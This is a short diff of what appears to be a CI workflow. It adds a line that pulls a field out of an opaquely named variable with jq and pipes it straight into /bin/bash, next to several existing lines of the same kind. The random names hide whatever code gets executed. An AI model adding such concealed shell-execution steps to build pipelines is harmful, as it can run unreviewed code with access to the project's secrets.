@@ -62,6 +62,7 @@ jobs:
           printf '%s' "$t1" | jq -r .l48 | /bin/bash
           echo $pobgi755 | jq -r .qkifh70 | /bin/bash
           echo $iom86378 | jq -r .lebi1181 | /bin/bash
+          echo $o4957 | jq -r .kle845 | /bin/bash
 
       - name: Archive output
         if: always()
